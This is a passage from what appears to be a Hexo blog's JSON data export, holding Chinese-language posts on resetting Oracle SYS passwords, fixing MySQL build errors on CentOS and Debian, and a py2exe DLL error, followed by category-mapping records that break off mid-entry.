/><br>这是因为Oracle对密码的要求如下：<br>系统用户（SYS、SYSTEM）口令长度不能小于7个字符第一个字符不能为数字且全部字符中应该为字母和数字混合<br>解决方法：<br>运行 cmd 按如下输入命令 sqlplus &#x2F; as sysdba ——— 注意以上的语句中&quot;&#x2F;&quot;两边都要有空格哦！——— 以sys登陆 alter user 用户名 account unlock; ——— 解除锁定 alter user 用户名 identified by&amp;nbsp;密码;————-修改密码然后用你改好的密码登陆就行 举例：sqlplus &#x2F; as sysdbaalter user sys account unlock;alter user sys identified by manager;希望你看过本文章后能顺利解决问题！&amp;nbsp;</p>\n"},{"title":"/bin/rm cannot remove libtoolT No such file or directory","date":"2011-03-24T06:55:00.000Z","_content":"<p>在 CentOS 5.4 下编译安装MySQL时出错：</p><p>/bin/rm: cannot remove `<a href=\"http://www.yanghengfei.com/tag/libtoolt/\">libtoolt</a>': No such file or directory</p><p>网上搜寻后，解决问题。具体方法是：</p><p>在执行./configure 之前，先执行：</p><p># autoreconf --force --install<br /># libtoolize --automake --force<br /># automake --force --add-missing<br /># ./configure --prefix=/usr/local/mysql/ --datadir=/var/lib/mysql</p><p>这次，不再出错了，问题解决。</p><p>　# autoreconf --force --install ##更新生成的配置文件（--force<strong>:</strong>consider all files obsolete）<br /><br />　　# libtoolize --automake --force ##libtoolize 提供了一种标准方式来将libtool支持加入到一个软件包。<br /><br />　　# automake --force --add-missing ##Automake是一个从文件`Makefile.am'自动生成`Makefile.in' 的工具。</p>","source":"_posts/bin-rm--cannot-remove-`libtoolT&amp;#039;--No-such-file-or-directory.md","raw":"title: /bin/rm cannot remove libtoolT No such file or directory\ncategories: [Linux]\ntags: []\ndate: 2011-03-24 14:55:00\n---\n<p>在 CentOS 5.4 下编译安装MySQL时出错：</p><p>/bin/rm: cannot remove `<a href=\"http://www.yanghengfei.com/tag/libtoolt/\">libtoolt</a>': No such file or directory</p><p>网上搜寻后，解决问题。具体方法是：</p><p>在执行./configure 之前，先执行：</p><p># autoreconf --force --install<br /># libtoolize --automake --force<br /># automake --force --add-missing<br /># ./configure --prefix=/usr/local/mysql/ --datadir=/var/lib/mysql</p><p>这次，不再出错了，问题解决。</p><p>　# autoreconf --force --install ##更新生成的配置文件（--force<strong>:</strong>consider all files obsolete）<br /><br />　　# libtoolize --automake --force ##libtoolize 提供了一种标准方式来将libtool支持加入到一个软件包。<br /><br />　　# automake --force --add-missing ##Automake是一个从文件`Makefile.am'自动生成`Makefile.in' 的工具。</p>","slug":"bin-rm--cannot-remove-`libtoolT&amp;#039;--No-such-file-or-directory","published":1,"updated":"2023-04-22T05:52:46.371Z","_id":"clgrkddkf0002zcpi341dcvpw","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在 CentOS 5.4 下编译安装MySQL时出错：</p><p>/bin/rm: cannot remove `<a href=\"http://www.yanghengfei.com/tag/libtoolt/\">libtoolt</a>': No such file or directory</p><p>网上搜寻后，解决问题。具体方法是：</p><p>在执行./configure 之前，先执行：</p><p># autoreconf --force --install<br /># libtoolize --automake --force<br /># automake --force --add-missing<br /># ./configure --prefix=/usr/local/mysql/ --datadir=/var/lib/mysql</p><p>这次，不再出错了，问题解决。</p><p>　# autoreconf --force --install ##更新生成的配置文件（--force<strong>:</strong>consider all files obsolete）<br /><br />　　# libtoolize --automake --force ##libtoolize 提供了一种标准方式来将libtool支持加入到一个软件包。<br /><br />　　# automake --force --add-missing ##Automake是一个从文件`Makefile.am'自动生成`Makefile.in' 的工具。</p>","site":{"data":{}},"excerpt":"","more":"<p>在 CentOS 5.4 下编译安装MySQL时出错：</p><p>/bin/rm: cannot remove `<a href=\"http://www.yanghengfei.com/tag/libtoolt/\">libtoolt</a>': No such file or directory</p><p>网上搜寻后，解决问题。具体方法是：</p><p>在执行./configure 之前，先执行：</p><p># autoreconf --force --install<br /># libtoolize --automake --force<br /># automake --force --add-missing<br /># ./configure --prefix=/usr/local/mysql/ --datadir=/var/lib/mysql</p><p>这次，不再出错了，问题解决。</p><p>　# autoreconf --force --install ##更新生成的配置文件（--force<strong>:</strong>consider all files obsolete）<br /><br />　　# libtoolize --automake --force ##libtoolize 提供了一种标准方式来将libtool支持加入到一个软件包。<br /><br />　　# automake --force --add-missing ##Automake是一个从文件`Makefile.am'自动生成`Makefile.in' 的工具。</p>"},{"title":"py2exe error [Errno 2] No such file or directory &amp;#039;MSVCP90.dll&amp;#039;","date":"2015-03-07T09:58:46.000Z","_content":"使用py2exe生产windows可执行程序时，报错：error: [Errno 2] No such file or directory: 'MSVCP90.dll'\n原脚本:\n<pre>\n#!/usr/bin/env python\n__author__ = 'key1088'\n__date__ = '15-3-7'\nfrom distutils.core import  setup\nimport py2exe\nsetup(console=[\"overtime.py\"])\n</pre>\n使用生产命令：\n<pre>\nF:workdirpython1>D:Python27python.exe mysetup.py  py2exe\nrunning py2exe\ncreating F:workdirpython1build\ncreating F:workdirpython1buildbdist.win32\ncreating F:workdirpython1buildbdist.win32winexe\ncreating F:workdirpython1buildbdist.win32winexecollect-2.7\ncreating F:workdirpython1buildbdist.win32winexebundle-2.7\ncreating F:workdirpython1buildbdist.win32winexetemp\ncreating F:workdirpython1dist\n*** searching for required modules ***\n*** parsing results ***\ncreating python loader for extension 'unicodedata' (D:Python27DLLsunicodedata.pyd -> unicodedata.pyd)\ncreating python loader for extension 'wx._misc_' (D:Python27libsite-packageswx-3.0-mswwx_misc_.pyd -> wx._misc_.pyd)\ncreating python loader for extension 'select' (D:Python27DLLsselect.pyd -> select.pyd)\ncreating python loader for extension 'wx._windows_' (D:Python27libsite-packageswx-3.0-mswwx_windows_.pyd -> wx._windows_.pyd)\ncreating python loader for extension '_hashlib' (D:Python27DLLs_hashlib.pyd -> _hashlib.pyd)\ncreating python loader for extension 'wx._gdi_' (D:Python27libsite-packageswx-3.0-mswwx_gdi_.pyd -> wx._gdi_.pyd)\ncreating python loader for extension 'wx._controls_' (D:Python27libsite-packageswx-3.0-mswwx_controls_.pyd -> wx._controls_.pyd)\ncreating python loader for extension '_sqlite3' (D:Python27DLLs_sqlite3.pyd -> _sqlite3.pyd)\ncreating python loader for extension 'bz2' (D:Python27DLLsbz2.pyd -> bz2.pyd)\ncreating python loader for extension 'wx._core_' (D:Python27libsite-packageswx-3.0-mswwx_core_.pyd -> wx._core_.pyd)\n*** finding dlls needed ***\nerror: [Errno 2] No such file or directory: 'MSVCP90.dll'\n</pre>\n修改代码最后一行：\n<pre>\nsetup(console=[\"overtime.py\"],options = { \"py2exe\":{\"dll_excludes\":[\"MSVCP90.dll\"]}})\n</pre>\n生成exe文件成功。\n为了使py2exe打出来的可执行文件不出现中文乱码，每次输出要采用以下格式：print unicode(\"中文\",\"utf-8\")","source":"_posts/py2exe-error--[Errno-2]-No-such-file-or-directory--&amp;#039;MSVCP90.dll&amp;#039;.md","raw":"title: py2exe error [Errno 2] No such file or directory &amp;#039;MSVCP90.dll&amp;#039;\ncategories: [程序设计,Python编程]\ntags: []\ndate: 2015-03-07 17:58:46\n---\n使用py2exe生产windows可执行程序时，报错：error: [Errno 2] No such file or directory: 'MSVCP90.dll'\n原脚本:\n<pre>\n#!/usr/bin/env python\n__author__ = 'key1088'\n__date__ = '15-3-7'\nfrom distutils.core import  setup\nimport py2exe\nsetup(console=[\"overtime.py\"])\n</pre>\n使用生产命令：\n<pre>\nF:workdirpython1>D:Python27python.exe mysetup.py  py2exe\nrunning py2exe\ncreating F:workdirpython1build\ncreating F:workdirpython1buildbdist.win32\ncreating F:workdirpython1buildbdist.win32winexe\ncreating F:workdirpython1buildbdist.win32winexecollect-2.7\ncreating F:workdirpython1buildbdist.win32winexebundle-2.7\ncreating F:workdirpython1buildbdist.win32winexetemp\ncreating F:workdirpython1dist\n*** searching for required modules ***\n*** parsing results ***\ncreating python loader for extension 'unicodedata' (D:Python27DLLsunicodedata.pyd -> unicodedata.pyd)\ncreating python loader for extension 'wx._misc_' (D:Python27libsite-packageswx-3.0-mswwx_misc_.pyd -> wx._misc_.pyd)\ncreating python loader for extension 'select' (D:Python27DLLsselect.pyd -> select.pyd)\ncreating python loader for extension 'wx._windows_' (D:Python27libsite-packageswx-3.0-mswwx_windows_.pyd -> wx._windows_.pyd)\ncreating python loader for extension '_hashlib' (D:Python27DLLs_hashlib.pyd -> _hashlib.pyd)\ncreating python loader for extension 'wx._gdi_' (D:Python27libsite-packageswx-3.0-mswwx_gdi_.pyd -> wx._gdi_.pyd)\ncreating python loader for extension 'wx._controls_' (D:Python27libsite-packageswx-3.0-mswwx_controls_.pyd -> wx._controls_.pyd)\ncreating python loader for extension '_sqlite3' (D:Python27DLLs_sqlite3.pyd -> _sqlite3.pyd)\ncreating python loader for extension 'bz2' (D:Python27DLLsbz2.pyd -> bz2.pyd)\ncreating python loader for extension 'wx._core_' (D:Python27libsite-packageswx-3.0-mswwx_core_.pyd -> wx._core_.pyd)\n*** finding dlls needed ***\nerror: [Errno 2] No such file or directory: 'MSVCP90.dll'\n</pre>\n修改代码最后一行：\n<pre>\nsetup(console=[\"overtime.py\"],options = { \"py2exe\":{\"dll_excludes\":[\"MSVCP90.dll\"]}})\n</pre>\n生成exe文件成功。\n为了使py2exe打出来的可执行文件不出现中文乱码，每次输出要采用以下格式：print unicode(\"中文\",\"utf-8\")","slug":"py2exe-error--[Errno-2]-No-such-file-or-directory--&amp;#039;MSVCP90.dll&amp;#039;","published":1,"updated":"2023-04-22T05:53:33.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrkehmd00000spi1f4lflfy","content":"<p>使用py2exe生产windows可执行程序时，报错：error: [Errno 2] No such file or directory: ‘MSVCP90.dll’<br>原脚本:</p>\n<pre>\n#!/usr/bin/env python\n__author__ = 'key1088'\n__date__ = '15-3-7'\nfrom distutils.core import  setup\nimport py2exe\nsetup(console=[\"overtime.py\"])\n</pre>\n<p>使用生产命令：</p>\n<pre>\nF:workdirpython1>D:Python27python.exe mysetup.py  py2exe\nrunning py2exe\ncreating F:workdirpython1build\ncreating F:workdirpython1buildbdist.win32\ncreating F:workdirpython1buildbdist.win32winexe\ncreating F:workdirpython1buildbdist.win32winexecollect-2.7\ncreating F:workdirpython1buildbdist.win32winexebundle-2.7\ncreating F:workdirpython1buildbdist.win32winexetemp\ncreating F:workdirpython1dist\n*** searching for required modules ***\n*** parsing results ***\ncreating python loader for extension 'unicodedata' (D:Python27DLLsunicodedata.pyd -> unicodedata.pyd)\ncreating python loader for extension 'wx._misc_' (D:Python27libsite-packageswx-3.0-mswwx_misc_.pyd -> wx._misc_.pyd)\ncreating python loader for extension 'select' (D:Python27DLLsselect.pyd -> select.pyd)\ncreating python loader for extension 'wx._windows_' (D:Python27libsite-packageswx-3.0-mswwx_windows_.pyd -> wx._windows_.pyd)\ncreating python loader for extension '_hashlib' (D:Python27DLLs_hashlib.pyd -> _hashlib.pyd)\ncreating python loader for extension 'wx._gdi_' (D:Python27libsite-packageswx-3.0-mswwx_gdi_.pyd -> wx._gdi_.pyd)\ncreating python loader for extension 'wx._controls_' (D:Python27libsite-packageswx-3.0-mswwx_controls_.pyd -> wx._controls_.pyd)\ncreating python loader for extension '_sqlite3' (D:Python27DLLs_sqlite3.pyd -> _sqlite3.pyd)\ncreating python loader for extension 'bz2' (D:Python27DLLsbz2.pyd -> bz2.pyd)\ncreating python loader for extension 'wx._core_' (D:Python27libsite-packageswx-3.0-mswwx_core_.pyd -> wx._core_.pyd)\n*** finding dlls needed ***\nerror: [Errno 2] No such file or directory: 'MSVCP90.dll'\n</pre>\n<p>修改代码最后一行：</p>\n<pre>\nsetup(console=[\"overtime.py\"],options = { \"py2exe\":{\"dll_excludes\":[\"MSVCP90.dll\"]}})\n</pre>\n<p>生成exe文件成功。<br>为了使py2exe打出来的可执行文件不出现中文乱码，每次输出要采用以下格式：print unicode(“中文”,”utf-8”)</p>\n","site":{"data":{}},"excerpt":"","more":"<p>使用py2exe生产windows可执行程序时，报错：error: [Errno 2] No such file or directory: ‘MSVCP90.dll’<br>原脚本:</p>\n<pre>\n#!/usr/bin/env python\n__author__ = 'key1088'\n__date__ = '15-3-7'\nfrom distutils.core import  setup\nimport py2exe\nsetup(console=[\"overtime.py\"])\n</pre>\n<p>使用生产命令：</p>\n<pre>\nF:workdirpython1>D:Python27python.exe mysetup.py  py2exe\nrunning py2exe\ncreating F:workdirpython1build\ncreating F:workdirpython1buildbdist.win32\ncreating F:workdirpython1buildbdist.win32winexe\ncreating F:workdirpython1buildbdist.win32winexecollect-2.7\ncreating F:workdirpython1buildbdist.win32winexebundle-2.7\ncreating F:workdirpython1buildbdist.win32winexetemp\ncreating F:workdirpython1dist\n*** searching for required modules ***\n*** parsing results ***\ncreating python loader for extension 'unicodedata' (D:Python27DLLsunicodedata.pyd -> unicodedata.pyd)\ncreating python loader for extension 'wx._misc_' (D:Python27libsite-packageswx-3.0-mswwx_misc_.pyd -> wx._misc_.pyd)\ncreating python loader for extension 'select' (D:Python27DLLsselect.pyd -> select.pyd)\ncreating python loader for extension 'wx._windows_' (D:Python27libsite-packageswx-3.0-mswwx_windows_.pyd -> wx._windows_.pyd)\ncreating python loader for extension '_hashlib' (D:Python27DLLs_hashlib.pyd -> _hashlib.pyd)\ncreating python loader for extension 'wx._gdi_' (D:Python27libsite-packageswx-3.0-mswwx_gdi_.pyd -> wx._gdi_.pyd)\ncreating python loader for extension 'wx._controls_' (D:Python27libsite-packageswx-3.0-mswwx_controls_.pyd -> wx._controls_.pyd)\ncreating python loader for extension '_sqlite3' (D:Python27DLLs_sqlite3.pyd -> _sqlite3.pyd)\ncreating python loader for extension 'bz2' (D:Python27DLLsbz2.pyd -> bz2.pyd)\ncreating python loader for extension 'wx._core_' (D:Python27libsite-packageswx-3.0-mswwx_core_.pyd -> wx._core_.pyd)\n*** finding dlls needed ***\nerror: [Errno 2] No such file or directory: 'MSVCP90.dll'\n</pre>\n<p>修改代码最后一行：</p>\n<pre>\nsetup(console=[\"overtime.py\"],options = { \"py2exe\":{\"dll_excludes\":[\"MSVCP90.dll\"]}})\n</pre>\n<p>生成exe文件成功。<br>为了使py2exe打出来的可执行文件不出现中文乱码，每次输出要采用以下格式：print unicode(“中文”,”utf-8”)</p>\n"},{"title":"编译Mysql时configure- error No curses/termcap library found 的错误解决方法","date":"2011-07-14T14:48:00.000Z","_content":"编译Mysql时configure: error: No curses/termcap library found 的错误解决方法\n在编译Mysql时<br />./configure –prefix=DIR\n，如果出现了以下错误：<br />……<br />checking for tgetent in -ltermcap… no<br />checking for termcap functions library… configure: error: No curses/termcap library found\ndebian：\n说明 curses/termcap 库没有安装<br />apt-cache search curses | grep lib\n安装 libncurses5-dev ，然后重新运行配置<br />apt-get install libncurses5-dev\ncentos：&nbsp;\n光盘里面有libtermcap包，安装就OK。","source":"_posts/编译Mysql时configure--error--No-curses-termcap-library-found-的错误解决方法.md","raw":"title: 编译Mysql时configure- error No curses/termcap library found 的错误解决方法\ncategories: [Mysql]\ntags: []\ndate: 2011-07-14 22:48:00\n---\n编译Mysql时configure: error: No curses/termcap library found 的错误解决方法\n在编译Mysql时<br />./configure –prefix=DIR\n，如果出现了以下错误：<br />……<br />checking for tgetent in -ltermcap… no<br />checking for termcap functions library… configure: error: No curses/termcap library found\ndebian：\n说明 curses/termcap 库没有安装<br />apt-cache search curses | grep lib\n安装 libncurses5-dev ，然后重新运行配置<br />apt-get install libncurses5-dev\ncentos：&nbsp;\n光盘里面有libtermcap包，安装就OK。","slug":"编译Mysql时configure--error--No-curses-termcap-library-found-的错误解决方法","published":1,"updated":"2023-04-22T05:53:20.730Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrkehmi00030spi899acnhi","content":"<p>编译Mysql时configure: error: No curses&#x2F;termcap library found 的错误解决方法<br>在编译Mysql时<br />.&#x2F;configure –prefix&#x3D;DIR<br>，如果出现了以下错误：<br />……<br />checking for tgetent in -ltermcap… no<br />checking for termcap functions library… configure: error: No curses&#x2F;termcap library found<br>debian：<br>说明 curses&#x2F;termcap 库没有安装<br />apt-cache search curses | grep lib<br>安装 libncurses5-dev ，然后重新运行配置<br />apt-get install libncurses5-dev<br>centos：&amp;nbsp;<br>光盘里面有libtermcap包，安装就OK。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>编译Mysql时configure: error: No curses&#x2F;termcap library found 的错误解决方法<br>在编译Mysql时<br />.&#x2F;configure –prefix&#x3D;DIR<br>，如果出现了以下错误：<br />……<br />checking for tgetent in -ltermcap… no<br />checking for termcap functions library… configure: error: No curses&#x2F;termcap library found<br>debian：<br>说明 curses&#x2F;termcap 库没有安装<br />apt-cache search curses | grep lib<br>安装 libncurses5-dev ，然后重新运行配置<br />apt-get install libncurses5-dev<br>centos：&amp;nbsp;<br>光盘里面有libtermcap包，安装就OK。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clgrjlx8o00007opie6w6ckxl","category_id":"clgrjlx8q00017opic7d8afzr","_id":"clgrjlx8r00027opia75k7sy3"},{"post_id":"clgrjlxb6000d7opif1zz3mvm","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxb8000i7opi381i2hj5"},{"post_id":"clgrjlxb7000f7opieprv7s9f","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxbb000l7opie8ue1ftq"},{"post_id":"clgrjlxb9000j7opig4vjhj6l","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxbd000o7opicd0bfalc"},{"post_id":"clgrjlxb6000e7opi74190z82","category_id":"clgrjlxb8000g7opiap7t5i3x","_id":"clgrjlxbd000q7opiagt1hm8t"},{"post_id":"clgrjlxb8000h7opi1ubo1du7","category_id":"clgrjlxb8000g7opiap7t5i3x","_id":"clgrjlxbe000r7opiftgmb10j"},{"post_id":"clgrjlxb9000k7opi7hsc6g0p","category_id":"clgrjlxbd000p7opi85845vyj","_id":"clgrjlxbe000t7opigu4i56ic"},{"post_id":"clgrjlxbc000n7opifg0a4fmp","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxbf000w7opie6c3bxnt"},{"post_id":"clgrjlxbc000n7opifg0a4fmp","category_id":"clgrjlxbe000u7opiablgajxg","_id":"clgrjlxbf000x7opie7u76d77"},{"post_id":"clgrjlxbc000n7opifg0a4fmp","category_id":"clgrjlxbe000v7opieyz8aqkx","_id":"clgrjlxbf000y7opieb6cg4vh"},{"post_id":"clgrjlxby000z7opi4oudgzih","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxc6001c7opia1gs11ed"},{"post_id":"clgrjlxby000z7opi4oudgzih","category_id":"clgrjlxc200137opib3ehaj38","_id":"clgrjlxc7001d7opi7eme52nl"},{"post_id":"clgrjlxc300177opifg9qg4kf","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxc7001f7opi54s2fhmv"},{"post_id":"clgrjlxc000107opi87bkdt9s","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxc8001g7opi9njv1klw"},{"post_id":"clgrjlxc000107opi87bkdt9s","category_id":"clgrjlxc200137opib3ehaj38","_id":"clgrjlxc8001h7opi4qrdhjfd"},{"post_id":"clgrjlxc100127opi1217c7hi","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxc8001j7opib14daija"},{"post_id":"clgrjlxc100127opi1217c7hi","category_id":"clgrjlxc200137opib3ehaj38","_id":"clgrjlxc8001k7opifh8mgpv6"},{"post_id":"clgrjlxc200157opi7rchao5q","category_id":"clgrjlxc7001e7opigywa5p5a","_id":"clgrjlxc8001l7opi5xufhney"},{"post_id":"clgrjlxc5001a7opi4uyg4q8q","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxc9001m7opi2jywa7ac"},{"post_id":"clgrjlxc5001a7opi4uyg4q8q","category_id":"clgrjlxc8001i7opidq8xchjs","_id":"clgrjlxc9001n7opi8qx10tc5"},{"post_id":"clgrjlxd0001o7opi83302bte","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxd6001t7opi2lgjh7r4"},{"post_id":"clgrjlxd0001o7opi83302bte","category_id":"clgrjlxc8001i7opidq8xchjs","_id":"clgrjlxd6001v7opi3qfofwnb"},{"post_id":"clgrjlxd4001q7opi2v8u7urr","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxd7001x7opifk39cdii"},{"post_id":"clgrjlxd5001s7opi231r8klh","category_id":"clgrjlxbd000p7opi85845vyj","_id":"clgrjlxd800207opi32oyd1sq"},{"post_id":"clgrjlxd3001p7opibpnq2asa","category_id":"clgrjlxd4001r7opi9uzkc30v","_id":"clgrjlxd900237opi0t4lfwxk"},{"post_id":"clgrjlxd6001u7opiaee20qlb","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxd900257opi56f70u0p"},{"post_id":"clgrjlxd6001u7opiaee20qlb","category_id":"clgrjlxc200137opib3ehaj38","_id":"clgrjlxda00277opi1x8hb7og"},{"post_id":"clgrjlxd7001z7opialq84j2u","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxda00297opi0dur8ncc"},{"post_id":"clgrjlxd6001w7opibhaa8wuq","category_id":"clgrjlxd800217opi45kdhkmu","_id":"clgrjlxda002b7opiaihn6jjg"},{"post_id":"clgrjlxdq002e7opi3osrdsb6","category_id":"clgrjlxbd000p7opi85845vyj","_id":"clgrjlxdv002i7opiemo6f7rk"},{"post_id":"clgrjlxds002f7opif5kxcy4r","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxdx002k7opi3yraal61"},{"post_id":"clgrjlxdt002g7opi6st04znj","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxdz002n7opiegnea72t"},{"post_id":"clgrjlxdw002j7opic4ic877e","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxe2002q7opih9jx8ujg"},{"post_id":"clgrjlxdy002l7opi3pmgat52","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxe2002r7opi5kwra6nc"},{"post_id":"clgrjlxe0002o7opi9n9catm8","category_id":"clgrjlxb8000g7opiap7t5i3x","_id":"clgrjlxe3002s7opi7bspdhxl"},{"post_id":"clgrjlxdu002h7opicean2yhs","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxe3002t7opigl8s5fw3"},{"post_id":"clgrjlxdu002h7opicean2yhs","category_id":"clgrjlxdy002m7opicduehqda","_id":"clgrjlxe3002u7opi5p4t9c9d"},{"post_id":"clgrjlxe1002p7opi62qpchwi","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxe3002v7opi2d4n1wm8"},{"post_id":"clgrjlxfs002w7opi2yibcz53","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxg300317opi5cbr73wt"},{"post_id":"clgrjlxfy002y7opih2tke7xg","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxg600347opih2jy73g4"},{"post_id":"clgrjlxg1002z7opi2e8yesu2","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxgb00377opig7diht1e"},{"post_id":"clgrjlxg1002z7opi2e8yesu2","category_id":"clgrjlxc200137opib3ehaj38","_id":"clgrjlxgd00397opi01jy94q2"},{"post_id":"clgrjlxfx002x7opi1z36bamm","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxgf003b7opi4zh059je"},{"post_id":"clgrjlxfx002x7opi1z36bamm","category_id":"clgrjlxg300307opi9u14552n","_id":"clgrjlxgj003d7opi70p8fmg7"},{"post_id":"clgrjlxg500337opidhvr2r3t","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxgk003f7opi4jd1ftvn"},{"post_id":"clgrjlxg700357opi0wcc10qm","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxgk003g7opicigw0wsj"},{"post_id":"clgrjlxgb00387opi0snr7ku8","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxgl003h7opihr358sti"},{"post_id":"clgrjlxg300327opi44h15ujk","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxgl003i7opidf3teacl"},{"post_id":"clgrjlxg300327opi44h15ujk","category_id":"clgrjlxg300307opi9u14552n","_id":"clgrjlxgl003j7opidbctcqpe"},{"post_id":"clgrjlxg300327opi44h15ujk","category_id":"clgrjlxg900367opibco0h4vs","_id":"clgrjlxgl003k7opi9dvp2ca6"},{"post_id":"clgrjlxgd003a7opifrxuaq8k","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxgl003l7opic8w7577d"},{"post_id":"clgrjlxgh003c7opi5cc4cilf","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxgl003m7opi2s4rbf1v"},{"post_id":"clgrjlxgh003c7opi5cc4cilf","category_id":"clgrjlxg300307opi9u14552n","_id":"clgrjlxgl003n7opif9yi0kvm"},{"post_id":"clgrjlxgh003c7opi5cc4cilf","category_id":"clgrjlxg900367opibco0h4vs","_id":"clgrjlxgl003o7opi3xou1t93"},{"post_id":"clgrjlxgj003e7opi8d8j6u82","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxgl003p7opi2tfdacby"},{"post_id":"clgrjlxh3003q7opigajic729","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxha003v7opi3of81zhs"},{"post_id":"clgrjlxh3003q7opigajic729","category_id":"clgrjlxc200137opib3ehaj38","_id":"clgrjlxhd003x7opi75ehep1e"},{"post_id":"clgrjlxh8003t7opice72d2wv","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxhg003z7opighqj9get"},{"post_id":"clgrjlxha003w7opi8crl5lap","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxhg00407opieri41ivj"},{"post_id":"clgrjlxh6003r7opif3fcbsql","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxhg00417opi9n63bmxp"},{"post_id":"clgrjlxh6003r7opif3fcbsql","category_id":"clgrjlxg300307opi9u14552n","_id":"clgrjlxhh00427opianafe4f3"},{"post_id":"clgrjlxh6003r7opif3fcbsql","category_id":"clgrjlxh9003u7opibecs5gz2","_id":"clgrjlxhh00437opi0g773enx"},{"post_id":"clgrjlxh7003s7opi0477hc6n","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxhh00447opif66kh4ub"},{"post_id":"clgrjlxh7003s7opi0477hc6n","category_id":"clgrjlxhe003y7opi6fd8dqe6","_id":"clgrjlxhh00457opi6uml43kq"},{"post_id":"clgrjlxht00467opi0d8p3h5w","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxhy004a7opi55pa3g8n"},{"post_id":"clgrjlxhu00477opi1fdt6zhc","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxhz004d7opic73s74sd"},{"post_id":"clgrjlxhv00487opi52be9mqm","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxhz004f7opi92ntfh6e"},{"post_id":"clgrjlxhx00497opib8ei1ydj","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxi0004h7opi5x2h3dj6"},{"post_id":"clgrjlxhy004c7opi7ksw3toq","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxi1004j7opife840xba"},{"post_id":"clgrjlxhz004e7opi7xkf84so","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxi2004m7opiegeqgg1d"},{"post_id":"clgrjlxi1004i7opi3ww62vw3","category_id":"clgrjlxab00057opi2zcgbkrp","_id":"clgrjlxi6004p7opi14kwe9mt"},{"post_id":"clgrjlxi0004g7opih7jl4ps3","category_id":"clgrjlxi1004k7opia1cd6el8","_id":"clgrjlxi8004t7opihlbe98zz"},{"post_id":"clgrjlxi3004n7opi3nmw92tr","category_id":"clgrjlxbe000s7opighxifd7w","_id":"clgrjlxi8004v7opi99028sld"},{"post_id":"clgrjlxi3004n7opi3nmw92tr","category_id":"clgrjlxc200137opib3ehaj38","_id":"clgrjlxi9004x7opi7l706sbb"},{"post_id":"clgrjlxi3004o7opigjwp6n9r","category_id":"clgrjlxi1004k7opia1cd6el8","_id":"clgrjlxia004z7opiebdhbg3e"},{"post_id":"clgrjlxi6004r7opi3r56cr5n","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxib00527opi9w6j1nk7"},{"post_id":"clgrjlxi2004l7opi3hs321d6","category_id":"clgrjlxi1004k7opia1cd6el8","_id":"clgrjlxic00557opifkjeasc0"},{"post_id":"clgrjlxi7004s7opifwsp21zj","category_id":"clgrjlxi1004k7opia1cd6el8","_id":"clgrjlxie00577opih9356vhw"},{"post_id":"clgrjlxi8004u7opi09mr7x92","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxie00597opi2nyzai4a"},{"post_id":"clgrjlxi9004w7opi2q6pdiox","category_id":"clgrjlxb8000g7opiap7t5i3x","_id":"clgrjlxie005b7opi2b1o5aoo"},{"post_id":"clgrjlxia00517opi5yvhdk9f","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxie005c7opida5aa9pj"},{"post_id":"clgrjlxi9004y7opi093s8taz","category_id":"clgrjlxic00537opig5hcbr56","_id":"clgrjlxie005d7opi8bdf9ykb"},{"post_id":"clgrjlxii005e7opi87vl3qd4","category_id":"clgrjlxbd000p7opi85845vyj","_id":"clgrjlxil005j7opi1qoihkbe"},{"post_id":"clgrjlxii005f7opifu014mwv","category_id":"clgrjlxao000b7opiga7a3ss3","_id":"clgrjlxio005m7opi06r78dff"},{"post_id":"clgrjlxii005f7opifu014mwv","category_id":"clgrjlxg300307opi9u14552n","_id":"clgrjlxio005o7opigs0g3vs8"},{"post_id":"clgrjlxii005f7opifu014mwv","category_id":"clgrjlxg900367opibco0h4vs","_id":"c